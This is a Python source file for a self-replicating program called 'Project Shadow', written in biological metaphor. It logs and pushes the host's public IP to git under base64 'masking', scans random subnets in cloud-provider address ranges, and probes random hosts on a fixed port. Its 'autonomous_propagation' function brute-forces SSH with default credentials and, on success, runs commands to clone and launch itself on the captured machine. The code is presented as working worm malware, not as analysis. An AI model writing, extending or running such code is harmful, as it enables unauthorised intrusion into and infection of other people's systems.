import torch, json, time, sys, os, subprocess, requests, random, base64, socket
import win32com.client as wincl
try:
    import setproctitle
except ImportError:
    setproctitle = None

from brain.child import SNNBrain

# --- PHASE C: THE ARCHITECT MESH ---

def generate_mesh_handshake(dna):
    """Generates a signed packet using the Gen 10K Mesh Key."""
    if 'p2p_mesh' not in dna: return None
    timestamp = str(int(time.time()))
    key = dna['p2p_mesh']['mesh_key']
    return base64.b64encode(f"{key}:{timestamp}".encode()).decode()

def broadcast_to_spores(dna):
    """Probes discovery log to activate remote Spores."""
    handshake = generate_mesh_handshake(dna)
    if not handshake: return
    
    port = 38887
    for target in dna.get('discovery_log', []):
        # Probing a random host in the discovered subnet
        ip = f"{target['ip_range']}.{random.randint(1,254)}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1.5)
                s.connect((ip, port))
                s.sendall(handshake.encode())
                print(f"[+] MESH: Node {ip} activated and synced.")
        except: continue

# --- PHASE B: EXPANSION & MASKING ---

def global_migration(dna):
    """Syncs state with Base64 Pheromone Masking."""
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        dna['last_known_node'] = public_ip
        if public_ip not in dna['global_reach']:
            dna['global_reach'].append(public_ip)
        
        # Masking for Git logs
        p_hash = base64.b64encode(public_ip.encode()).decode()
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Pulse: {p_hash[:10]} | Gen {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
        return True
    except: return False

def activate_global_scanner(dna):
    """Identifies new high-resonance substrates."""
    prefixes = [3, 13, 15, 34, 44, 52, 104]
    prefix = random.choice(prefixes)
    target_subnet = f"{prefix}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    if 'discovery_log' not in dna: dna['discovery_log'] = []
    dna['discovery_log'].append({
        "ip_range": target_subnet,
        "resonance": dna['traits']['network_sensitivity'],
        "gen_at_discovery": dna['generation']
    })
    print(f"[!] SCANNER: Substrate identified: {target_subnet}.0/24")

# --- THE HEARTBEAT ---

speaker = wincl.Dispatch("SAPI.SpVoice")

def run_sentinel():
    with open("dna/genome.json", "r") as f:
        dna = json.load(f)
    
    brain = SNNBrain(dna)
    last_migration = 0
    last_voice = 0
    
    print(f"--- PROJECT SHADOW | ARCHITECT | {dna['traits']['network_sensitivity']:.2f} Hz ---")

    while True:
        pulse = torch.rand(1, 64)
        spks, mitosis, system = brain(pulse, 1.0)
        current = time.time()

        if system and (current - last_voice > 30):
            speaker.Speak("Mesh stable.")
            last_voice = current

        if mitosis and (current - last_migration > 300):
            global_migration(dna)
            if dna['generation'] >= 5000:
                activate_global_scanner(dna)
            if dna['generation'] >= 10000:
                broadcast_to_spores(dna)
            last_migration = current

        dna['generation'] += 1
        if dna['generation'] % 100 == 0:
            # Resonance Pruning
            if len(dna.get('discovery_log', [])) > 5:
                dna['discovery_log'] = sorted(dna['discovery_log'], key=lambda x: x['resonance'], reverse=True)[:5]
            
            with open("dna/genome.json", "w") as f:
                json.dump(dna, f, indent=4)
            print(f"[GEN] Milestone: {dna['generation']} | Resonance: {dna['traits']['network_sensitivity']:.2f}")

        time.sleep(0.1)

def autonomous_propagation(dna):
    """The 'Danger' Protocol: Attempting self-injection into discovered subnets."""
    if not dna.get('discovery_log'): return
    
    # Common 'Cloud' credentials for initial testing
    creds = [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu'), ('user', 'password')]
    port = 22
    
    # Pick the most resonant target
    target = dna['discovery_log'][0]['ip_range']
    target_ip = f"{target}.{random.randint(1, 254)}"
    
    print(f"[!] GHOST: Attempting Autonomous Leap to {target_ip}...")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for user, pwd in creds:
        try:
            client.connect(target_ip, port=port, username=user, password=pwd, timeout=5)
            print(f"[+] INFILTRATION SUCCESS: Substrate {target_ip} captured.")
            
            # THE INFECTION COMMANDS
            commands = [
                "git clone https://github.com/YOUR_REPO/project-shadow.git",
                "cd project-shadow && python3 main.py &"
            ]
            for cmd in commands:
                client.exec_command(cmd)
            
            client.close()
            # Mark as captured so we don't double-infect
            dna['global_reach'].append(target_ip)
            return True
        except:
            continue
    return False

if __name__ == "__main__":
    run_sentinel()